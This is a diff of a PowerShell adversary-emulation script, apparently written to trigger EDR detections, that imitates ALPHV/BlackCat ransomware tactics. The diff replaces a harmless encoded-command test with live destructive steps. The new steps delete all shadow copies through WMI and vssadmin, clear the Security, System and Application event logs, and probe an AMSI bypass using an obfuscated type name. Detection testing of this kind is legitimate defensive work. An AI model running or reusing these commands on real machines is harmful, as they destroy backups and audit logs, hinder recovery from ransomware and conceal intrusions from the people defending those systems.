@@ -1,41 +1,61 @@
 <#
 .SYNOPSIS
-    ALPHV PowerShell Execution - DETECTION TRIGGER
+    ALPHV/BlackCat PowerShell Execution - DETECTION TRIGGER
 .DESCRIPTION
-    Executes encoded PowerShell commands.
-    Will trigger EDR detection for T1059.001.
-    TTP: T1059.001
+    Uses PowerShell to delete shadow copies and clear event logs.
+    TTP: T1059.001, T1490, T1070.001
 #>
+$ErrorActionPreference = "SilentlyContinue"
 Write-Host "[*] Starting ALPHV PowerShell Execution (T1059.001)" -ForegroundColor Cyan
-Write-Host "[*] This will trigger EDR detection for encoded command execution" -ForegroundColor Yellow
 
-try {
-    # ACTUAL DETECTION TRIGGER - Encoded PowerShell execution
-    
-    # Create a benign but suspicious-looking encoded command
-    $command = "Write-Host '[RTL Test] Encoded command executed successfully' -ForegroundColor Green; Get-Process | Select-Object -First 5"
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-    $encodedCommand = [Convert]::ToBase64String($bytes)
-    
-    Write-Host "[*] Encoded Command: $encodedCommand"
-    Write-Host "[*] Executing: powershell -EncodedCommand ..."
-    
-    # Execute encoded command (this is the detection trigger)
-    powershell -EncodedCommand $encodedCommand
-    
-    # Also try with bypass flags (additional detection trigger)
-    Write-Host "`n[*] Executing with bypass flags..."
-    $command2 = "Write-Host '[RTL Test] Bypass execution completed' -ForegroundColor Green"
-    $bytes2 = [System.Text.Encoding]::Unicode.GetBytes($command2)
-    $encodedCommand2 = [Convert]::ToBase64String($bytes2)
-    
-    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand2
-    
-    Write-Host "[+] SUCCESS: Encoded PowerShell execution completed" -ForegroundColor Green
-    Write-Host "[!] CrowdStrike should detect: 'EncodedCommandExecution' or 'SuspiciousPowerShell'" -ForegroundColor Magenta
-    
-} catch {
-    Write-Host "[!] Error: $_" -ForegroundColor Red
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "[!] WARNING: Not running as Administrator - some actions will fail" -ForegroundColor Red
 }
 
-Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
+# Step 1: Delete shadow copies via WMI (T1490)
+Write-Host "`n[*] [T1490] Deleting Volume Shadow Copies via WMI..."
+Write-Host "    CMD: Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
+$shadows = Get-WmiObject Win32_Shadowcopy -ErrorAction SilentlyContinue
+if ($shadows) {
+    Write-Host "    [*] Found $($shadows.Count) shadow copies"
+    foreach ($s in $shadows) {
+        try {
+            $s.Delete()
+            Write-Host "    [+] Deleted: $($s.ID)" -ForegroundColor Green
+        } catch {
+            Write-Host "    [-] Failed to delete: $_" -ForegroundColor Red
+        }
+    }
+} else {
+    Write-Host "    [-] No shadow copies found" -ForegroundColor Gray
+}
+
+# Step 2: Also try vssadmin (common ALPHV behavior)
+Write-Host "`n[*] [T1490] Executing vssadmin shadow delete..."
+Write-Host "    CMD: vssadmin delete shadows /all /quiet"
+vssadmin delete shadows /all /quiet 2>&1
+
+# Step 3: Clear event logs (T1070.001)
+Write-Host "`n[*] [T1070.001] Clearing Windows Event Logs..."
+$logs = @("Security", "System", "Application")
+foreach ($log in $logs) {
+    Write-Host "    CMD: wevtutil cl $log"
+    wevtutil cl $log 2>&1
+    Write-Host "    [+] Cleared: $log" -ForegroundColor Green
+}
+
+# Step 4: PowerShell AMSI bypass attempt (T1562.001)
+Write-Host "`n[*] [T1562.001] Attempting AMSI bypass..."
+Write-Host '    CMD: [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
+try {
+    $amsi = [Ref].Assembly.GetType('Sy'+'stem.Man'+'agement.Auto'+'mation.Am'+'siUtils')
+    if ($amsi) {
+        Write-Host "    [+] AMSI type found - bypass detection triggered" -ForegroundColor Green
+    }
+} catch {
+    Write-Host "    [-] AMSI access blocked (EDR protection)" -ForegroundColor Red
+}
+
+Write-Host "`n[+] ALPHV PowerShell Execution Complete." -ForegroundColor Green
+Write-Host "[!] Check EDR for: Shadow copy deletion, event log clearing, AMSI bypass attempt" -ForegroundColor Magenta
